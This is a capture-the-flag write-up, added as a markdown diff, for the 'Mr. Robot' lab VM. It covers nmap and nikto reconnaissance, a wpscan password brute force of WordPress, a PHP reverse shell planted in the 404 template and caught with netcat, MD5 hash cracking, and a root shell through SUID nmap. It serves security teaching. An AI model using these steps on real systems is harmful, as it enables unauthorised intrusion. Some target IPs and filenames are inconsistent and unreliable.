@@ -1,0 +1,629 @@
+# HAL 2020-03-03 - Mr. Robot
+
+ * [Kali Setup](#kali)
+ * [Reconnaissance](#Reconnaissance)
+   * [Flag #1](#flag-1)
+ * [Flag #2](#flag-2)
+ * [Flag #3](#flag-3)
+ 
+
+## Kali Setup
+
+First thing is first we need to enable a network interface on kali linux as it doesn't have one enabled by default. Don't worry if you dont understand this part, it's not integral to the challenge.
+
+We need to add a configuration for `eth0` interface to the `/etc/network/interfaces` file.
+
+```bash
+nano /etc/network/interfaces
+```
+
+Add the following lines to the bottom of the file.
+
+>Hint: you can paste in nano with `ctrl` + `shift` + `v`
+
+```
+auto eth0
+iface eth0 inet dhcp
+```
+
+Save the changes with `ctrl` + `o` (think Write **O**ut)
+
+Exit the editor with `ctrl` + `x` (think E**x**it )
+
+Restart the network interface
+
+```
+root@kali:~# ifdown eth0
+```
+
+```
+root@kali:~# ifup eth0
+
+Internet Systems Consortium DHCP Client 4.4.1
+Copyright 2004-2018 Internet Systems Consortium.
+All rights reserved.
+For info, please visit https://www.isc.org/software/dhcp/
+
+Listening on LPF/eth0/08:00:27:33:75:72
+Sending on   LPF/eth0/08:00:27:33:75:72
+Sending on   Socket/fallback
+DHCPDISCOVER on eth0 to 255.255.255.255 port 67 interval 7
+DHCPOFFER of 10.0.2.15 from 10.0.2.3
+DHCPREQUEST for 10.0.2.15 on eth0 to 255.255.255.255 port 67
+DHCPACK of 10.0.2.15 from 10.0.2.3     
+bound to 10.0.2.15 -- renewal in 506 seconds.      
+```
+
+So our IP address should be the IP address shown on the bottom line E.g. `10.0.2.15`
+
+We can confirm by using `ipconfig` to check the IP address assigned to `eth0`
+
+```
+root@kali:~# ifconfig eth0
+
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255
+        inet6 fe80::a00:27ff:fe33:7572  prefixlen 64  scopeid 0x20<link>
+        ether 08:00:27:33:75:72  txqueuelen 1000  (Ethernet)
+        RX packets 6138  bytes 8222095 (7.8 MiB)
+        RX errors 2  dropped 0  overruns 0  frame 0
+        TX packets 3115  bytes 230609 (225.2 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+        device interrupt 19  base 0xd020    
+```
+
+The IP address of our kali machine shown next to `inet` is `10.0.2.15`. Don't worry if yours is different.
+
+# Flag #1
+
+## Reconnaissance
+
+In the previous section we setup a new ethernet and discovered our own IP address on our NAT Network.
+
+Now we need to identify our target vulnerable VM. We can do this by scanning the network for other devices.
+
+>**Warning!** Scanning networks, IP ranges or address that you do not have explicit permission to scan is considered abuse and may result in legal action against you.
+
+Two tools which can help us do this are:
+
+ * [netdiscover]()
+ * [nmap]()
+
+Use the `man` command to find out more about each tool. E.g. `man nmap`
+
+**Scan IP range - disable port scan** 
+```
+root@kali:~# nmap -sn 10.0.2.*
+```
+or
+```
+root@kali:~# nmap -sn 10.0.2.0/24
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-02 06:31 EST
+Nmap scan report for 10.0.2.1
+Host is up (0.00026s latency).
+MAC Address: 52:54:00:12:35:00 (QEMU virtual NIC)
+Nmap scan report for 10.0.2.2
+Host is up (0.000095s latency).
+MAC Address: 52:54:00:12:35:00 (QEMU virtual NIC)
+Nmap scan report for 10.0.2.3
+Host is up (0.000070s latency).
+MAC Address: 08:00:27:1D:F1:E5 (Oracle VirtualBox virtual NIC)
+Nmap scan report for 10.0.2.5
+Host is up (0.00029s latency).
+MAC Address: 08:00:27:F9:B8:5B (Oracle VirtualBox virtual NIC)
+Nmap scan report for 10.0.2.15
+Host is up.
+Nmap done: 256 IP addresses (5 hosts up) scanned in 2.16 seconds
+```
+
+>**Note:** `10.0.2.*` and `10.0.2.0/24` are both valid ways to specify all IP addresses which start with `10.0.2`
+
+Since the device identified for `10.0.2.5` is *(Oracle VirtualBox virtual NIC)* which looks similar to our VM `10.0.2.15` let's examine that one further.
+
+We can find out more about this particular host such as what services might be running on the host by using `nmap` again, without the `-sn` flag.
+
+```
+root@kali:~# nmap 10.0.2.5
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-02 06:52 EST
+Nmap scan report for 10.0.2.5
+Host is up (0.00030s latency).
+Not shown: 997 filtered ports
+PORT    STATE  SERVICE
+22/tcp  closed ssh
+80/tcp  open   http
+443/tcp open   https
+MAC Address: 08:00:27:F9:B8:5B (Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 4.76 seconds
+```
+
+nmap scanned the 1000 most common ports and found 3 network ports are open; `ssh` for remote access and `http`/`https` for serving websites.
+
+Lets go see what websites are being served on that VM. Open a browser an `10.0.2.5` type the IP address into the Address bar.
+
+There's a website being served here. One good thing to do when you find a website like this is check for a [robots.txt](https://www.robotstxt.org/) file. Most websites have one and they are often used to tell webcrawlers and search engines where **NOT** to look. Hmmm...
+
+http://10.0.2.15/robots.txt
+
+```
+User-agent: *
+fsocity.dic
+key-1-of-3.txt
+```
+
+Flag found!
+
+http://10.0.2.15/key-1-of-3.txt
+
+```
+073403c8a58a1f80d943455fb30724b9
+```
+
+# Flag #2
+
+Note theres also one other file listed in the `robots.txt` file. Let's save it for later
+
+```
+root@kali:~# curl http://10.0.2.5/fsocity.dic -o fsocity.dic
+```
+
+Let's find out more about this website. What is it? What does it do? Can we get access?
+
+Tools:
+
+ * [nikto]()
+
+>**Warning!** Scanning websites that you do not have explicit permission to scan is considered abuse and may result in legal action against you.
+
+```
+root@kali:~# nikto -h http://10.0.2.5:80
+
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.0.2.5
++ Target Hostname:    10.0.2.5
++ Target Port:        80
++ Start Time:         2020-01-16 00:18:42 (GMT-5)
+---------------------------------------------------------------------------
++ Server: Apache
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ Retrieved x-powered-by header: PHP/5.5.29
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Uncommon header 'tcn' found, with contents: list
++ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.html, index.php
++ OSVDB-3092: /admin/: This might be interesting...
++ Uncommon header 'link' found, with contents: <http://10.0.2.5/?p=23>; rel=shortlink
++ /wp-links-opml.php: This WordPress script reveals the installed version.
++ OSVDB-3092: /license.txt: License file found may identify site software.
++ /admin/index.html: Admin login page/section found.
++ Cookie wordpress_test_cookie created without the httponly flag
++ /wp-login/: Admin login page/section found.
++ /wordpress: A Wordpress installation was found.
++ /wp-admin/wp-login.php: Wordpress login found
++ /wordpresswp-admin/wp-login.php: Wordpress login found
++ /blog/wp-login.php: Wordpress login found
++ /wp-login.php: Wordpress login found
++ /wordpresswp-login.php: Wordpress login found
++ 7915 requests: 0 error(s) and 18 item(s) reported on remote host
++ End Time:           2020-01-16 00:24:17 (GMT-5) (335 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+```
+
+The results of the scan tell us it's a wordpress website.
+
+```
++ /wordpress: A Wordpress installation was found.   
+```
+
+And that the wordpress website has login and admin login pages.
+
+```
++ /wp-login/: Admin login page/section found.
++ /wp-admin/wp-login.php: Wordpress login found
+```
+
+We can visit the admin login page in our browser.
+
+http://10.0.2.5/wp-login/
+
+But we need a username and password to log in.
+
+Tools:
+
+ * [wpscan]()
+
+```n
+root@kali:~# wpscan --url http://10.0.2.5/ -e u,t,p
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.7.6
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[i] It seems like you have not updated the database for some time.
+[?] Do you want to update now? [Y]es [N]o, default: [N][+] URL: http://10.0.2.5/
+[+] Started: Mon Mar  2 07:36:32 2020
+
+Interesting Finding(s):
+
+[+] http://10.0.2.5/
+ | Interesting Entries:
+ |  - Server: Apache
+ |  - X-Mod-Pagespeed: 1.9.32.3-4523
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] http://10.0.2.5/robots.txt
+ | Found By: Robots Txt (Aggressive Detection)
+ | Confidence: 100%
+
+[+] http://10.0.2.5/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access
+
+[+] http://10.0.2.5/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] http://10.0.2.5/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 4.3.22 identified (Latest, released on 2019-12-12).
+ | Found By: Rss Generator (Aggressive Detection)
+ |  - http://10.0.2.5/feed/, <generator>https://wordpress.org/?v=4.3.22</generator>
+ |  - http://10.0.2.5/comments/feed/, <generator>https://wordpress.org/?v=4.3.22</generator>
+
+[i] The main theme could not be detected.
+
+[+] Enumerating Most Popular Plugins (via Passive Methods)
+
+[i] No plugins Found.
+
+[+] Enumerating Most Popular Themes (via Passive and Aggressive Methods)
+ Checking Known Locations - Time: 00:00:11 <==========================================================================================================================================================> (400 / 400) 100.00% Time: 00:00:11
+
+[i] No themes Found.
+
+[+] Enumerating Users (via Passive and Aggressive Methods)
+ Brute Forcing Author IDs - Time: 00:00:00 <============================================================================================================================================================> (10 / 10) 100.00% Time: 00:00:00
+
+[i] No Users Found.
+
+[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up
+
+[+] Finished: Mon Mar  2 07:36:50 2020
+[+] Requests Done: 457
+[+] Cached Requests: 9
+[+] Data Sent: 103.041 KB
+[+] Data Received: 175.652 KB
+[+] Memory used: 164.25 MB
+[+] Elapsed time: 00:00:18
+```
+
+Try Username `Elliot`
+
+```
+root@kali:~# cat fsociety.dic | sort | uniq > fsociety.dic
+```
+
+```
+root@kali:~# wpscan --url http://10.0.2.5/ -U Elliot -P fsocuniq.dic
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.7.6
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+.
+.
+.
+
+[+] Performing password attack on Xmlrpc Multicall against 1 user/s
+[SUCCESS] - Elliot / ER28-0652
+All Found
+Progress Time: 00:00:51 <===================================
+
+[i] Valid Combinations Found:
+ | Username: Elliot, Password: ER28-0652
+
+[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up
+
+[+] Finished: Mon Mar  2 07:49:18 2020
+[+] Requests Done: 65
+[+] Cached Requests: 5
+[+] Data Sent: 15.811 KB
+[+] Data Received: 1.27 MB
+[+] Memory used: 180.98 MB
+[+] Elapsed time: 00:00:58
+```
+
+|Username|Password|
+|---|---|
+|Elliot|ER28-0652|
+
+Let's try login with those credentials.
+
+http://10.0.2.5/wp-login
+
+Success! And we are an admin user.
+
+## Reverse Shell
+
+Wordpress provides a useful interface to allow adminstrators to edit the them in real time via the wordpress interface - since wordpress themes are just PHP files
+this essentially means arbitrary code execution.
+
+Terrible practice all around but very convenient for us. We can use the arbitrary code execution to setup a reverse shell and get access to the underlying VM.
+
+Tools:
+ * [php-reverse-shell.php](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
+
+[php-reverse-shell.php](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) is a useful script which lets us setup a reverse shell with minimal effort.
+
+We'll make the code run by embedding it in the wordpress template for 404 pages. In the wordpress menu go to `Appearance` > `Editor` and select `404 Template (404.php)` from the list of templates on the right.
+
+Copy and paste the [php-reverse-shell.php](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) script into the 404 Template, overwriting all of the existing content.
+
+We need to change the lines at the top of the script ending with `// CHANGE THIS`
+
+```php
+set_time_limit (0);
+$VERSION = "1.0";
+$ip = '127.0.0.1';  // CHANGE THIS
+$port = 1234;       // CHANGE THIS
+$chunk_size = 1400;
+$write_a = null;
+$error_a = null;
+$shell = 'uname -a; w; id; /bin/sh -i';
+$daemon = 0;
+$debug = 0;
+```
+Change to the IP addess to the IP addess of our own kali VM which you can find by running `ifconfig eth0` again.
+
+Leave `$port` as is.
+```php
+$ip = '10.0.2.15';  // CHANGE THIS
+$port = 1234;       // CHANGE THIS
+```
+
+Save the template.
+
+When the script is run it will try to establish a TCP nework connection to the configured ip address (`10.0.2.15`) and port (`1234`).
+
+Before we trigger the script we need to configure our computer to listen for a connection on port `1234`.
+
+Tools:
+
+ * [netcat / nc]()
+
+Netcat, or `nc` for short, is a swiss army knife for all such networking tasks.
+
+We will create a netcat listener to catch the connection from the wordpress site.
+
+```
+root@kali:~# nc -nvlp 1234
+listening on [any] 1234 ...
+```
+
+Now, while the netcat listener is running trigger the reverse shell script by visiting a non existant URL on the website, causing wordpress to process the  `404 Template` with our reverse shell script.
+
+http://10.0.2.5/idontexist
+
+Check your netcat listener and see it's now connected!
+
+```
+root@kali:~# nc -nvlp 1234
+listening on [any] 1234 ...
+connect to [10.0.2.15] from (UNKNOWN) [10.0.2.5] 42478
+Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
+ 13:31:05 up  2:08,  1 user,  load average: 0.00, 0.01, 0.05
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+robot    tty1                      11:24    2:06m  0.08s  0.02s -bash
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+/bin/sh: 0: can't access tty; job control turned off
+$ 
+```
+
+Congratuations you now have an interactive reverse shell to the website. But what can we do with that?
+
+## Privilege Escalation
+
+We need to figure out what we can do on the server. Lets first check what user we are logged in as.
+
+```
+$ whoami  
+daemon
+```
+
+Currently we are logged in as the daemon - the process which the website is running on. Good sysadmins normally try to minimise daemon processes access all unecessary parts of the system so we could try switch to a different user.
+
+Lets see what users have home folders on the serer.
+
+```
+$ ls -Rhal /home/*
+/home/robot:
+total 16K
+drwxr-xr-x 2 root  root  4.0K Nov 13  2015 .
+drwxr-xr-x 3 root  root  4.0K Nov 13  2015 ..
+-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
+-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
+```
+
+There's one user with a home directory in `/home` called `robot`. We can also see `robot` has `key-2-of-3.txt` in their home folder.
+
+```
+$ cat /home/robot/key-2-of-3.txt
+cat: /home/robot/key-2-of-3.txt: Permission denied
+```
+
+Unfortunately we can't read it. Based on the file permission (`-r--------`) only robot and no one else can read that file.
+
+We can however read password.raw-md5 which has less restrictive file permissions (`-rw-r--r--`)
+
+```
+$ cat /home/robot/password.raw-md5              
+robot:c3fcd3d76192e4007dfb496cca67e13b
+```
+
+Based on the name of the file this looks like and MD5 hash of the `robot` user's password.
+
+Thanks to ever advancing computing power MD5 hashes on their own are trivial crack. Ther are many websites which will do this for you for free and just googling the MD5 hash should give you the results from several of these such websites.
+
+From my top google result:
+
+>The MD5 hash:<br>
+>c3fcd3d76192e4007dfb496cca67e13b<br>
+>was succesfully reversed into the string:<br>
+>abcdefghijklmnopqrstuvwxyz<br>
+
+If we're unsure about the correctness of the result we can easily verify the result ourselves by hashing the result again and checking it matches the original 
+hash.
+
+```
+root@kali:~# echo -n "abcdefghijklmnopqrstuvwxyz" | md5sum
+c3fcd3d76192e4007dfb496cca67e13b
+```
+
+It's a match. If the file is what we think it is then we may have a username and password for the `robot` user.
+
+|username|password|
+|---|---|
+|robot|abcdefghijklmnopqrstuvwxyz|
+
+We can login as `robot` using `su`
+
+```
+$ su robot
+su: must be run from a terminal 
+```
+
+To use `su` we need to be logged in to a TTY terminal which we currently are not.
+
+No worries though! There's a myriad of ways we can get one detailed here https://netsec.ws/?p=337
+
+
+```
+$ python -c 'import pty; pty.spawn("/bin/sh")'
+```
+
+No news is good news. Lets try login as robot again.
+
+```
+$ su robot
+su robot
+Password: abcdefghijklmnopqrstuvwxyz
+
+robot@linux:/$
+```
+
+Sucess! We are logged in as Robot lets get that key!
+
+```
+robot@linux:/$ cat ~/key-2-of-3.txt
+822c73956184f694993bede3eb39f959
+```
+
+# Flag #3
+
+## Further Privlege Escalation
+
+We managed to log in as a proper user on the server. Buy why stop now? We want `root`
+
+Let's look for binaries with the [SUID bit]() set on their file permission
+
+```bash
+robot@linux:~$ find / -perm -4000 2>/dev/null
+/bin/ping
+/bin/umount
+/bin/mount
+/bin/ping6
+/bin/su
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/local/bin/nmap
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+/usr/lib/pt_chown
+```
+
+Note nmap appers in the list of programs.
+```
+/usr/local/bin/nmap
+```
+
+From our list of ways to get TTY shells note that nmap, when run in in interactive mode can give us a shell as follows https://netsec.ws/?p=337
+
+>(From within nmap)
+>```
+>!sh
+>```
+>
+
+
+``` 
+robot@linux:~$ /usr/local/bin/nmap --interactive 
+/usr/local/bin/nmap --interactive
+
+Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
+Welcome to Interactive Mode -- press h <enter> for help
+nmap> 
+```
+
+Spawn a shell
+
+```
+nmap> !sh 
+!sh
+# 
+```
+
+The `#` indicates we are now the `root` user. The key is probably stored in the `root` home directory found at `/root`
+
+```
+# ls /root
+ls /root
+firstboot_done  key-3-of-3.txt
+```
+
+```
+# cat /root/key-3-of-3.txt
+cat /root/key-3-of-3.txt
+04787ddef27c3dee1ee161b21670b4e4
+```
